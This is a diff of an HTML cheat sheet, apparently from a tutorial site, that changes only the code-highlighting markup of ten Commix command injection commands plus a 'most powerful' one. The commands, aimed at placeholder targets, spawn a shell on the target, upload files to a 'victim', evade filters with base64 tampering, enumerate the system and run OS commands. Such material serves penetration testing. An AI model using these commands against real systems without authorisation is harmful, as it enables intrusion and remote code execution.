@@ -126,58 +126,58 @@
 <p><strong>Commix</strong> (Command Injection Exploiter) is an automated tool used to test and exploit command injection vulnerabilities.</p>
 <h2>Top 10 Useful Commands</h2>
 <h3>1. Basic Scan</h3>
-<pre class="codehilite"><code class="language-bash">commix --url=&quot;http://target.com?id=1&quot;
-</code></pre>
+<div class="codehilite"><pre><span></span><code>commix<span class="w"> </span>--url<span class="o">=</span><span class="s2">&quot;http://target.com?id=1&quot;</span>
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Standard injection test on URL parameters.</p>
 <h3>2. Interactive Shell</h3>
-<pre class="codehilite"><code class="language-bash">commix --url=&quot;...&quot; --os-shell
-</code></pre>
+<div class="codehilite"><pre><span></span><code>commix<span class="w"> </span>--url<span class="o">=</span><span class="s2">&quot;...&quot;</span><span class="w"> </span>--os-shell
+</code></pre></div>
 
 <p><strong>Explanation:</strong> If vulnerable, spawn a pseudo-shell on the target.</p>
 <h3>3. Batch Mode</h3>
-<pre class="codehilite"><code class="language-bash">commix --url=&quot;...&quot; --batch
-</code></pre>
+<div class="codehilite"><pre><span></span><code>commix<span class="w"> </span>--url<span class="o">=</span><span class="s2">&quot;...&quot;</span><span class="w"> </span>--batch
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Non-interactive mode.</p>
 <h3>4. Post Data</h3>
-<pre class="codehilite"><code class="language-bash">commix --url=&quot;http://target.com/login&quot; --data=&quot;user=admin&amp;input=123&quot;
-</code></pre>
+<div class="codehilite"><pre><span></span><code>commix<span class="w"> </span>--url<span class="o">=</span><span class="s2">&quot;http://target.com/login&quot;</span><span class="w"> </span>--data<span class="o">=</span><span class="s2">&quot;user=admin&amp;input=123&quot;</span>
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Test POST body parameters.</p>
 <h3>5. Injection Point</h3>
-<pre class="codehilite"><code class="language-bash">commix --url=&quot;http://target.com?id=1*&amp;debug=true&quot;
-</code></pre>
+<div class="codehilite"><pre><span></span><code>commix<span class="w"> </span>--url<span class="o">=</span><span class="s2">&quot;http://target.com?id=1*&amp;debug=true&quot;</span>
+</code></pre></div>
 
 <p><strong>Explanation:</strong> The <code>*</code> marks the specific injection point to test.</p>
 <h3>6. Level (Intensity)</h3>
-<pre class="codehilite"><code class="language-bash">commix --url=&quot;...&quot; --level=3
-</code></pre>
+<div class="codehilite"><pre><span></span><code>commix<span class="w"> </span>--url<span class="o">=</span><span class="s2">&quot;...&quot;</span><span class="w"> </span>--level<span class="o">=</span><span class="m">3</span>
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Checks more payloads/headers.</p>
 <h3>7. Alter Agents</h3>
-<pre class="codehilite"><code class="language-bash">commix --url=&quot;...&quot; --random-agent
-</code></pre>
+<div class="codehilite"><pre><span></span><code>commix<span class="w"> </span>--url<span class="o">=</span><span class="s2">&quot;...&quot;</span><span class="w"> </span>--random-agent
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Random User-Agent.</p>
 <h3>8. Upload File</h3>
-<pre class="codehilite"><code class="language-bash">commix --url=&quot;...&quot; --file-write=&quot;local.txt&quot; --file-dest=&quot;/tmp/remote.txt&quot;
-</code></pre>
+<div class="codehilite"><pre><span></span><code>commix<span class="w"> </span>--url<span class="o">=</span><span class="s2">&quot;...&quot;</span><span class="w"> </span>--file-write<span class="o">=</span><span class="s2">&quot;local.txt&quot;</span><span class="w"> </span>--file-dest<span class="o">=</span><span class="s2">&quot;/tmp/remote.txt&quot;</span>
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Upload a file to the victim.</p>
 <h3>9. Base64 Evasion</h3>
-<pre class="codehilite"><code class="language-bash">commix --url=&quot;...&quot; --tamper=base64
-</code></pre>
+<div class="codehilite"><pre><span></span><code>commix<span class="w"> </span>--url<span class="o">=</span><span class="s2">&quot;...&quot;</span><span class="w"> </span>--tamper<span class="o">=</span>base64
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Encode payloads to bypass filters.</p>
 <h3>10. Enumeration</h3>
-<pre class="codehilite"><code class="language-bash">commix --url=&quot;...&quot; --all
-</code></pre>
+<div class="codehilite"><pre><span></span><code>commix<span class="w"> </span>--url<span class="o">=</span><span class="s2">&quot;...&quot;</span><span class="w"> </span>--all
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Retireve all system info (user, hostname, ip, etc).</p>
 <h2>The Most Powerful Command</h2>
-<pre class="codehilite"><code class="language-bash">commix -r req.txt --level=3 --os-cmd=&quot;whoami&quot;
-</code></pre>
+<div class="codehilite"><pre><span></span><code>commix<span class="w"> </span>-r<span class="w"> </span>req.txt<span class="w"> </span>--level<span class="o">=</span><span class="m">3</span><span class="w"> </span>--os-cmd<span class="o">=</span><span class="s2">&quot;whoami&quot;</span>
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Use a saved request file and immediately execute a single command ("whoami") if successful.</p>
         </div>
